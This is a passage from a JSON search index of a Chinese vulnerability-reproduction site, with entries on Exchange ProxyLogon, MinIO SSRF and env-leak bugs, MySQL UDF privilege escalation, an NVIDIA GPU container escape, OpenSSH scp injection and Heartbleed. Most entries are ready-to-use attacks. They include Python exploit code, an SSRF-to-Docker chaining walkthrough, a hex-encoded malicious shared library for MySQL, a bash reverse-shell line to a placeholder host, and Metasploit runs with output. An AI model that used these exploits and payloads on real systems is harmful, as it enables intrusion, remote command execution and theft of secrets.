'X-BEResource=a]@{}:444{}?#~1941962753'.format(computer_name, vuln_url), 'msExchLogonMailbox': 'S-1-5-20' } url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False) LegacyDN = re.findall(r'\u003cLegacyDN\u003e(.*?)\u003c/LegacyDN\u003e', response.text)[0] print(\"\\033[32m[o] LegacyDN: {}\\033[0m\".for","date":"0001-01-01","objectID":"/microsoft-exchange-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2021-27065-26857-26858/:5:0","tags":null,"title":"","uri":"/microsoft-exchange-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2021-27065-26857-26858/"},{"categories":null,"content":"MinIO SSRF漏洞 CVE-2021-21287 ","date":"0001-01-01","objectID":"/minio-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21287/:0:0","tags":null,"title":"","uri":"/minio-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21287/"},{"categories":null,"content":"漏洞描述 随着工作和生活中的一些环境逐渐往云端迁移，对象存储的需求也逐渐多了起来，MinIO 就是一款支持部署在私有云的开源对象存储系统。MinIO完全兼容AWS S3的协议，也支持作为S3的网关，所以在全球被广泛使用，在Github上已有25k星星。MinIO中存在SSRF漏洞，通过漏洞可以获取敏感信息或远程命令执行 ","date":"0001-01-01","objectID":"/minio-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21287/:1:0","tags":null,"title":"","uri":"/minio-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21287/"},{"categories":null,"content":"漏洞影响 MinIO ","date":"0001-01-01","objectID":"/minio-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21287/:2:0","tags":null,"title":"","uri":"/minio-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21287/"},{"categories":null,"content":"漏洞复现 既然我们选择了从MinIO入手，那么先了解一下MinIO。其实我前面也说了，因为平时用到MinIO的时候很多，所以这一步可以省略了。其使用Go开发，提供HTTP接口，而且还提供了一个前端页面，名为“MinIO Browser”。当然，前端页面就是一个登陆接口，不知道口令无法登录。 那么从入口点（前端接口）开始对其进行代码审计吧。 在User-Agent满足正则.*Mozilla.*的情况下，我们即可访问MinIO的前端接口，前端接口是一个自己实现的JsonRPC： 我们感兴趣的就是其鉴权的方法，随便找到一个RPC方法，可见其开头调用了webRequestAuthenticate，跟进看一下，发现这里用的是jwt鉴权： jwt常见的攻击方法主要有下面这几种： 将alg设置为None，告诉服务器不进行签名校验 如果alg为RSA，可以尝试修改为HS256，即告诉服务器使用公钥进行签名的校验 爆破签名密钥 查看MinIO的JWT模块，发现其中对alg进行了校验，只允许以下三种签名方法： 这就堵死了前两种绕过方法，爆破当然就更别说了，通常仅作为没办法的情况下的手段。当然，MinIO中使用用户的密码作为签名的密钥，这个其实会让爆破变地简单一些。 鉴权这块没啥突破，我们就可以看看，有哪些RPC接口没有进行权限验证。 很快找到了一个接口，LoginSTS。这个接口其实是AWS STS登录接口的一个代理，用于将发送到JsonRPC的请求转变成STS的方式转发给本地的9000端口（也就还是他自己，因为它是兼容AWS协议的）。 简化其代码如下： // LoginSTS - STS user login handler. func (web *webAPIHandlers) LoginSTS(r *http.Request, args *LoginSTSArgs, reply *LoginRep) error { ctx := newWebContext(r, args, \"WebLoginSTS\") v := url.Values{} v.Set(\"Action\", webIdentity) v.Set(\"WebIdentityToken\", args.Token) v.Set(\"Version\", stsAPIVersion) scheme := \"http\" // ... u := \u0026url.URL{ Scheme: scheme, Host: r.Host, } u.RawQuery = v.Encode() req, err := http.NewRequest(http.MethodPost, u.String(), nil) // ... } 没发现有鉴权上的绕过问题，但是发现了另一个有趣的问题。这里，MinIO为了将请求转发给“自己”，就从用户发送的HTTP头Host中获取到“自己的地址”，并将其作为URL的Host构造了新的URL。 这个过程有什么问题呢？ 因为请求头是用户可控的，所以这里可以构造任意的Host，进而构造一个SSRF漏洞。 我们来实际测试一下，向http://192.168.227.131:9000发送如下请求，其中Host的值是我本地ncat开放的端口（192.168.1.142:4444）： POST /minio/webrpc HTTP/1.1 Host: 192.168.1.142:4444 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Content-Type: application/json Content-Length: 80 {\"id\":1,\"jsonrpc\":\"2.0\",\"params\":{\"token\": \"Test\"},\"method\":\"web.LoginSTS\"} 成功收到请求： 可以确定这里存在一个SSRF漏洞了。 仔细观察，可以发现这是一个POST请求，但是Path和Body都没法控制，我们能控制的只有URL中的一个参数WebIdentityToken。 但是这个参数经过了URL编码，无法注入换行符等其他特殊字符。这样就比较鸡肋了，如果仅从现在来看，这个SSRF只能用于扫描端口。我们的目标当然不仅限于此。 幸运的是，Go默认的http库会跟踪302跳转，而且不论是GET还是POST请求。所以，我们这里可以302跳转来“升级”SSRF漏洞。 使用PHP来简单地构造一个302跳转： \u003c?php header('Location: http://192.168.1.142:4444/attack?arbitrary=params'); 将其保存成index.php，启动一个PHP服务器： 将Host指向这个PHP服务器。这样，经过一次302跳转，我们收获了一个可以控制完整URL的GET请求： 放宽了一些限制，结合前面我对这套内网的了解，我们可以尝试攻击Docker集群的2375端口。 2375是Docker API的接口，使用HTTP协议通信，默认不会监听TCP地址，这里可能是为了方便内网其他机器使用所以开放在内网的地址里了。那么，我们是否可以通过SSRF来攻击这个接口呢？ 在Docker未授权访问的情况下，我们通常可以使用docker run或docker exec来在目标容器里执行任意命令（如果你不了解，可以参考[这篇文章](http://blog.neargle.com/SecNewsBak/drops/ 新姿势之Docker Remote API未授权访问漏洞分析和利用.html)）。但是翻阅Docker的文档可知，这两个操作的请求是POST /containers/create和POST /containers/{id}/exec。 两个API都是POST请求，而我们可以构造的SSRF却是一个GET的。怎么办呢？ 还记得我们是怎样获得这个GET型的SSRF的吗？通过302跳转，而接受第一次跳转的请求就是一个POST请求。不过我们没法直接利用这个POST请求，因为他的Path不可控。 如何构造一个Path可控的POST请求呢？ 我想到了307跳转，307跳转是在RFC 7231 中定义的一种HTTP状态码，描述如下： The 307 (Temporary Redirect) status code indicates that the target resource resides temporarily under a different URI and the user agent MUST NOT change the request method if it performs an automatic redirection to that URI. 307跳转的特点就是不会改变原始请求的方法，也就是说，在服务端返回307状态码的情况下，客户端会按照Location指向的地址发送一个相同方法的请求。 我们正好可以利用这个特性，来获得POST请求。 简单修改一下之前的index.php： \u003c?php header('Location: http://192.168.1.142:4444/attack?arbitrary=params', false, 307); 尝试SSRF击，收到了预期的请求： Bingo，获得了一个POST请求的SSRF，虽然没有Body。 回到Docker API，我发现现在仍然没法对run和exec两个API做利用，原因是，这两个API都需要在请求Body中传输JSON格式的参数，而我们这里的SSRF无法控制Body。 继续翻越Docker文档，我发现了另一个API，Build an image ： 这个API的大部分参数是通过Query Parameters传输的，我们可以控制。阅读其中的选项，发现它可以接受一个名为remote的参数，其说明为： A Git repository URI or HTTP/HTTPS context URI. If the URI points to a single text file, the file’s contents are placed into a file called Dockerfile and the image is built from that file. If the URI points to a tarball, the file is downloaded by the daemon and the contents therein used as the context for the build. If the URI points to a tarball and the dockerfile parameter is also specified, there must be a file with the corresponding path inside the tarball. 这个参数可以传入一个Git地址或者一个HTTP URL，内容是一个Dockerfile或者一个包含了Dockerfile的Git项目或者一个压缩包。 也就是说，Docker API支持通过指定远程URL的方式来构建镜像，而不需要我在本地写入一个Dockerfile。 所以，我尝试编写了这样一个Do","date":"0001-01-01","objectID":"/minio-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21287/:3:0","tags":null,"title":"","uri":"/minio-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21287/"},{"categories":null,"content":"参考文章 https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html ","date":"0001-01-01","objectID":"/minio-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21287/:4:0","tags":null,"title":"","uri":"/minio-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21287/"},{"categories":null,"content":"MinIO verify 敏感信息泄漏漏洞 CVE-2023-28432 ","date":"0001-01-01","objectID":"/minio-verify-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-28432/:0:0","tags":null,"title":"","uri":"/minio-verify-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-28432/"},{"categories":null,"content":"漏洞描述 Minio 是一个多云对象存储框架。在从RELEASE.2019-12-17T23-16-33Z开始到RELEASE.2023-03-20T20-16-18Z之前的集群部署中，MinIO存在漏洞发送请求后返回所有环境变量，包括MINIO_SECRET_KEY和MINIO_ROOT_PASSWORD，导致信息泄露。分布式部署的所有用户都会受到影响 ","date":"0001-01-01","objectID":"/minio-verify-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-28432/:1:0","tags":null,"title":"","uri":"/minio-verify-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-28432/"},{"categories":null,"content":"漏洞影响 MinIO \u003c= RELEASE.2023-03-20T20-16-18Z ","date":"0001-01-01","objectID":"/minio-verify-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-28432/:2:0","tags":null,"title":"","uri":"/minio-verify-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-28432/"},{"categories":null,"content":"网络测绘 app=\"minio\" ","date":"0001-01-01","objectID":"/minio-verify-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-28432/:3:0","tags":null,"title":"","uri":"/minio-verify-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-28432/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC (默认端口:9000) POST /minio/bootstrap/v1/verify ","date":"0001-01-01","objectID":"/minio-verify-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-28432/:4:0","tags":null,"title":"","uri":"/minio-verify-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-28432/"},{"categories":null,"content":"MySQL UDF提权 ","date":"0001-01-01","objectID":"/mysql-udf%E6%8F%90%E6%9D%83/:0:0","tags":null,"title":"","uri":"/mysql-udf%E6%8F%90%E6%9D%83/"},{"categories":null,"content":"漏洞描述 UDF是MySQL的一个共享库，通过udf创建能够执行系统命令的函数sys_exec、sys_eval，使得入侵者能够获得一般情况下无法获得的shell执行权限。 参考链接： https://github.com/mysqludf/lib_mysqludf_sys https://www.sqlsec.com/2020/11/mysql.html#%E5%86%99%E5%85%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93 ","date":"0001-01-01","objectID":"/mysql-udf%E6%8F%90%E6%9D%83/:1:0","tags":null,"title":"","uri":"/mysql-udf%E6%8F%90%E6%9D%83/"},{"categories":null,"content":"漏洞影响 在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件 在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件 ","date":"0001-01-01","objectID":"/mysql-udf%E6%8F%90%E6%9D%83/:2:0","tags":null,"title":"","uri":"/mysql-udf%E6%8F%90%E6%9D%83/"},{"categories":null,"content":"漏洞复现 寻找插件目录，将 UDF 的动态链接库文件放到 MySQL 的插件目录： mysql\u003e show variables like '%plugin%'; +---------------+-------------------------+ | Variable_name | Value | +---------------+-------------------------+ | plugin_dir | /usr/lib64/mysql/plugin | +---------------+-------------------------+ 1 row in set (0.00 sec) 检查是否已经有人导出过了： mysql\u003e select * from func; 写入动态链接库，需要有/usr/lib64/mysql/plugin/目录的写入权限： mysql\u003e select unhex('7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F6578","date":"0001-01-01","objectID":"/mysql-udf%E6%8F%90%E6%9D%83/:3:0","tags":null,"title":"","uri":"/mysql-udf%E6%8F%90%E6%9D%83/"},{"categories":null,"content":"NVIDIA GPU显示驱动程序 信息泄露 CVE-2021-1056 ","date":"0001-01-01","objectID":"/nvidia-gpu%E6%98%BE%E7%A4%BA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-1056/:0:0","tags":null,"title":"","uri":"/nvidia-gpu%E6%98%BE%E7%A4%BA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-1056/"},{"categories":null,"content":"漏洞描述 用于Linux的NVIDIA GPU显示驱动程序在内核模式层（nvidia.ko）中包含一个漏洞，在该漏洞中，它没有完全遵守操作系统文件系统提供GPU设备级隔离的权限，这可能导致拒绝服务或信息泄露。 ","date":"0001-01-01","objectID":"/nvidia-gpu%E6%98%BE%E7%A4%BA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-1056/:1:0","tags":null,"title":"","uri":"/nvidia-gpu%E6%98%BE%E7%A4%BA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-1056/"},{"categories":null,"content":"漏洞影响 NVIDIA GPU显示驱动程序 ","date":"0001-01-01","objectID":"/nvidia-gpu%E6%98%BE%E7%A4%BA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-1056/:2:0","tags":null,"title":"","uri":"/nvidia-gpu%E6%98%BE%E7%A4%BA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-1056/"},{"categories":null,"content":"环境搭建 Dokcer版本: 19.03 git clone https://github.com/pokerfaceSad/CVE-2021-1056.git cd CVE-2021-1056 docker run --gpus 1 -v $PWD:/CVE-2021-1056 -it tensorflow/tensorflow:1.13.2-gpu bash ","date":"0001-01-01","objectID":"/nvidia-gpu%E6%98%BE%E7%A4%BA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-1056/:3:0","tags":null,"title":"","uri":"/nvidia-gpu%E6%98%BE%E7%A4%BA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-1056/"},{"categories":null,"content":"漏洞复现 进入容器检查 GPU状态，只有一块GPU In Container# nvidia-smi Sat Jan 9 07:21:03 2021 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450.51.05 Driver Version: 450.51.05 CUDA Version: 11.0 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | | | | MIG M. | |===============================+======================+======================| | 0 Tesla V100-PCIE... Off | 00000000:02:00.0 Off | 0 | | N/A 27C P0 23W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | |=============================================================================| | No running processes found | +-----------------------------------------------------------------------------+ 在容器中执行漏洞利用脚本，在最后的nvidia-smi的输出中可以看到宿主机所有GPU在容器中都已经可见了 In Container# bash /CVE-2021-1056/main.sh [INFO] init GPU num: 1 [DEBUG] /dev/nvidia0 exists, skip [DEBUG] successfully get /dev/nvidia1 [DEBUG] successfully get /dev/nvidia2 [DEBUG] successfully get /dev/nvidia3 [DEBUG] delete redundant /dev/nvidia4 [INFO] get extra 3 GPU devices from host [INFO] current GPU num: 4 [INFO] exec nvidia-smi: Sat Jan 9 07:22:43 2021 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450.51.05 Driver Version: 450.51.05 CUDA Version: 11.0 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | | | | MIG M. | |===============================+======================+======================| | 0 Tesla V100-PCIE... Off | 00000000:02:00.0 Off | 0 | | N/A 27C P0 23W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 1 Tesla V100-PCIE... Off | 00000000:03:00.0 Off | 0 | | N/A 30C P0 25W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 2 Tesla V100-PCIE... Off | 00000000:82:00.0 Off | 0 | | N/A 29C P0 25W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 3 Tesla V100-PCIE... Off | 00000000:83:00.0 Off | 0 | | N/A 28C P0 25W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | |=============================================================================| | No running processes found | +-----------------------------------------------------------------------------+ 为了验证这些GPU确实是可用的，执行一个tensorflow的demo，可以看到所有的GPU确实可以被容器中的进程使用 In Container# nohup python /CVE-2021-1056/tf_distr_demo.py \u003e log 2\u003e\u00261 \u0026 In Container$ nvidia-smi Sat Jan 9 18:58:23 2021 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450.51.05 Driver Version: 450.51.05 CUDA Version: 11.0 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | | | | MIG M. | |===============================+======================+======================| | 0 Tesla V100-PCIE... Off | 00000000:02:00.0 Off | 0 | | N/A 32C P0 36W / 250W | 31117MiB / 32510MiB | 1% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 1 Tesla V100-PCI","date":"0001-01-01","objectID":"/nvidia-gpu%E6%98%BE%E7%A4%BA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-1056/:4:0","tags":null,"title":"","uri":"/nvidia-gpu%E6%98%BE%E7%A4%BA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-1056/"},{"categories":null,"content":"参考文章 https://github.com/pokerfaceSad/CVE-2021-1056/blob/master/docs/QuickStart.md ","date":"0001-01-01","objectID":"/nvidia-gpu%E6%98%BE%E7%A4%BA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-1056/:5:0","tags":null,"title":"","uri":"/nvidia-gpu%E6%98%BE%E7%A4%BA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-1056/"},{"categories":null,"content":"OpenSSH 命令注入漏洞 CVE-2020-15778 ","date":"0001-01-01","objectID":"/openssh-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-15778/:0:0","tags":null,"title":"","uri":"/openssh-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-15778/"},{"categories":null,"content":"漏洞描述 2020年6月9日，研究人员Chinmay Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。深信服安全研究团队依据漏洞重要性和影响力进行评估，作出漏洞通告。 ","date":"0001-01-01","objectID":"/openssh-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-15778/:1:0","tags":null,"title":"","uri":"/openssh-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-15778/"},{"categories":null,"content":"漏洞影响 OpenSSH \u003c= 8.3p1 ","date":"0001-01-01","objectID":"/openssh-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-15778/:2:0","tags":null,"title":"","uri":"/openssh-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-15778/"},{"categories":null,"content":"漏洞复现 可用于目标不允许远程登录但SCP开启的情况下远程命令执行 攻击机创建 peiqi.txt ，利用 scp上传文件 到 /tmp 目录下 执行命令 ping dnslog 反弹shell 更换命令即可 /bin/bash -i \u003e\u0026 /dev/tcp/xxx.xxx.xxx.xxx/9999 0\u003e\u00261 ","date":"0001-01-01","objectID":"/openssh-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-15778/:3:0","tags":null,"title":"","uri":"/openssh-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-15778/"},{"categories":null,"content":"OpenSSL 心脏滴血漏洞 CVE-2014-0160 ","date":"0001-01-01","objectID":"/openssl-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E-cve-2014-0160/:0:0","tags":null,"title":"","uri":"/openssl-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E-cve-2014-0160/"},{"categories":null,"content":"漏洞描述 2014年4月7日，OpenSSL发布安全公告，在OpenSSL1.0.1版本至OpenSSL1.0.1f Beta1版本中存在漏洞，该漏洞中文名称为心脏滴血，英文名称为HeartBleed。其中Heart是指该漏洞位于心跳协议上，Bleed是因为该漏洞会造成数据泄露。即HeartBleed是在心跳协议上的一个数据泄露漏洞，OpenSSL库中用到了该心跳协议。HeartBleed主要存在与OpenSSL的1.0.1版本到1.0.1f版本。 ","date":"0001-01-01","objectID":"/openssl-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E-cve-2014-0160/:1:0","tags":null,"title":"","uri":"/openssl-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E-cve-2014-0160/"},{"categories":null,"content":"漏洞影响 OpenSSL1.0.1、1.0.1a、1.0.1b、1.0.1c、1.0.1d、1.0.1e、1.0.1f、Beta 1 of OpenSSL 1.0.2等版本 ","date":"0001-01-01","objectID":"/openssl-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E-cve-2014-0160/:2:0","tags":null,"title":"","uri":"/openssl-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E-cve-2014-0160/"},{"categories":null,"content":"环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/openssl/heartbleed docker-compose up -d ","date":"0001-01-01","objectID":"/openssl-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E-cve-2014-0160/:3:0","tags":null,"title":"","uri":"/openssl-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E-cve-2014-0160/"},{"categories":null,"content":"漏洞复现 使用Nmap检测脚本对目标进行检测 检测到心脏滴血漏洞，使用MSF对目标进行攻击 msf5 \u003e use auxiliary/scanner/ssl/openssl_heartbleed msf5 auxiliary(scanner/ssl/openssl_heartbleed) \u003e show options Module options (auxiliary/scanner/ssl/openssl_heartbleed): Name Current Setting Required Description ---- --------------- -------- ----------- DUMPFILTER no Pattern to filter leaked memory before storing LEAK_COUNT 1 yes Number of times to leak memory per SCAN or DUMP invocation MAX_KEYTRIES 50 yes Max tries to dump key RESPONSE_TIMEOUT 10 yes Number of seconds to wait for a server response RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u003cpath\u003e' RPORT 443 yes The target port (TCP) STATUS_EVERY 5 yes How many retries until key dump status THREADS 1 yes The number of concurrent threads (max one per host) TLS_CALLBACK None yes Protocol to use, \"None\" to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES) TLS_VERSION 1.0 yes TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2) Auxiliary action: Name Description ---- ----------- SCAN Check hosts for vulnerability msf5 auxiliary(scanner/ssl/openssl_heartbleed) \u003e set rhost 192.168.51.133 rhost =\u003e 192.168.51.133 msf5 auxiliary(scanner/ssl/openssl_heartbleed) \u003e set verbose true verbose =\u003e true msf5 auxiliary(scanner/ssl/openssl_heartbleed) \u003e run [*] 192.168.51.133:443 - Leaking heartbeat response #1 [*] 192.168.51.133:443 - Sending Client Hello... [*] 192.168.51.133:443 - SSL record #1: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 86 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 82 [*] 192.168.51.133:443 - Type: Server Hello (2) [*] 192.168.51.133:443 - Server Hello Version: 0x0301 [*] 192.168.51.133:443 - Server Hello random data: 5fd46996727a4e50c0e2eaecf52d1592384aaa6870d4d65eea8b6b34eb47a389 [*] 192.168.51.133:443 - Server Hello Session ID length: 32 [*] 192.168.51.133:443 - Server Hello Session ID: 66e9cacbefcb28955de31c38bd9dff93de153a6d6247fa117ebc3f2f091d6f74 [*] 192.168.51.133:443 - SSL record #2: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 822 [*] 192.168.51.133:443 - Handshake #1: [*] 